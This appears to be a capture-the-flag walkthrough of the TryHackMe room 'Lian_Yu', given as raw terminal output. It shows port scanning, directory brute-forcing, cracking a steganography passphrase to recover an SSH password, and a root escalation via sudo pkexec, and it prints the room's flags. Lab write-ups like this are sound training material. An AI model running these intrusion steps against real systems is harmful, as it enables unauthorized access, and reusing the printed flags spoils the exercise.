```
rustscan -a 10.49.145.196
```

```
rustscan -a 10.49.145.196
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
You miss 100% of the ports you don't scan. - RustScan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.49.145.196:22
Open 10.49.145.196:21
Open 10.49.145.196:80
Open 10.49.145.196:111
Open 10.49.145.196:36426
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 15:25 -0400
Initiating Ping Scan at 15:25
Scanning 10.49.145.196 [4 ports]
Completed Ping Scan at 15:25, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:25
Completed Parallel DNS resolution of 1 host. at 15:25, 0.51s elapsed
DNS resolution of 1 IPs took 0.51s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:25
Scanning 10.49.145.196 [5 ports]
Discovered open port 80/tcp on 10.49.145.196
Discovered open port 22/tcp on 10.49.145.196
Discovered open port 21/tcp on 10.49.145.196
Discovered open port 36426/tcp on 10.49.145.196
Discovered open port 111/tcp on 10.49.145.196
Completed SYN Stealth Scan at 15:25, 0.06s elapsed (5 total ports)
Nmap scan report for 10.49.145.196
Host is up, received echo-reply ttl 62 (0.051s latency).
Scanned at 2026-07-07 15:25:23 EDT for 0s

PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 62
22/tcp    open  ssh     syn-ack ttl 62
80/tcp    open  http    syn-ack ttl 62
111/tcp   open  rpcbind syn-ack ttl 62
36426/tcp open  unknown syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
     Raw packets sent: 9 (372B) | Rcvd: 6 (248B)


```


```
nmap -sC -sV -p 21,22,80,111,36426 10.49.145.196

```


```

nmap -sC -sV -p 21,22,80,111,36426 10.49.145.196
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 15:26 -0400
Nmap scan report for 10.49.145.196
Host is up (0.051s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36426/tcp   status
|   100024  1          37312/udp6  status
|   100024  1          39567/udp   status
|_  100024  1          57488/tcp6  status
36426/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


```
gobuster dir -u http://10.49.145.196 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.145.196
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
island               (Status: 301) [Size: 236] [--> http://10.49.145.196/island/]
Progress: 23773 / 220558 (10.78%)[ERROR] error on word 7339: timeout occurred during the request
Progress: 73765 / 220557 (33.44%)^C

```


![[Pasted image 20260708015239.png]]

```
gobuster dir -u http://10.49.145.196/island  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.145.196/island
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
2100                 (Status: 301) [Size: 241] [--> http://10.49.145.196/island/2100/]
Progress: 79330 / 220557 (35.97%)^C
    
```

![[Pasted image 20260708020559.png]]

```
gobuster dir -u http://10.49.145.196/island/2100  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x .ticket
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.145.196/island/2100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
green_arrow.ticket   (Status: 200) [Size: 71]
Progress: 34827 / 441116 (7.90%)^C

```

![[Pasted image 20260708020751.png]]
![[Pasted image 20260708024518.png]]

```
ftp 10.49.145.196
Connected to 10.49.145.196.
220 (vsFTPd 3.0.2)
Name (10.49.145.196:kali): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||42670|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
229 Entering Extended Passive Mode (|||46780|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |*****************************************************************************************************************|   186 KiB  299.96 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:00 (276.95 KiB/s)
ftp> cat .other_user
?Invalid command.
ftp> get .other_user
local: .other_user remote: .other_user
229 Entering Extended Passive Mode (|||28390|).
150 Opening BINARY mode data connection for .other_user (2483 bytes).
100% |*****************************************************************************************************************|  2483        3.13 MiB/s    00:00 ETA
226 Transfer complete.
2483 bytes received in 00:00 (48.30 KiB/s)
ftp> 

```

```

                                                                                                                                                           
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# steghide extract -sf aa.jpg               
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# stegcracker aa.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2026 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 68 passwords
Your file has been written to: aa.jpg.out
password
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# file aa.jpg.out 
aa.jpg.out: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Apr 28 2020 02:06:00, uncompressed size 333, method=deflate
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# unzip aa.jpg.out                 
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado                   
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat passwd.txt           
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.





                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat shado 
M3tahuman
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ls
500-worst-passwords.txt          cry.txt                      lone_id                                                  roomex.py
aa.jpg                           ctf-env                      magic_link_login.php                                     ro.php
aa.jpg.out                       easypeasy_1596838725703.txt  N1R0M-Jr-Pentester-AD-v01-6a1e8133d0022c23d11cd1c3.ovpn  scanner2.py
ap-south-1-hrmunna-regular.ovpn  exploit                      passwd.txt                                               scanner.py
be2sOV9.jpeg                     exploit.py                   pepper_1611998632625.jpg                                 script.js
best1050.txt                     factor.py                    pepper_1611998632625.jpg.out                             secrettext.txt
binarycodepixabay.jpg            flag.py                      php-reverse-shell.php                                    shado
bruteforce2.py                   forget.py                    release_arena_us-release-1.ovpn                          sh.php
bruteforce.py                    hashes.asrep                 reports                                                  solve.py
Business-Manager.txt             hash.txt                     ResetPassword.vbs                                        tony
Business-Sections.txt            kerbrute_linux_amd64         role.py                                                  users.txt
Business-Tracking.txt            lone                         roomex2.py                                               wordlist.txt
cftpa.txt                        lone1                        roomex3.py
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat .other_user 
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.

                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ssh slade@10.49.145.196                                                                                
The authenticity of host '10.49.145.196 (10.49.145.196)' can't be established.
ED25519 key fingerprint is: SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.145.196' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
slade@10.49.145.196's password: 
Permission denied, please try again.
slade@10.49.145.196's password: 
Permission denied, please try again.
slade@10.49.145.196's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

slade@LianYu:~$ id
uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Sorry, try again.
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
root.txt
# cat root
cat: root: No such file or directory
# cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

# 

```





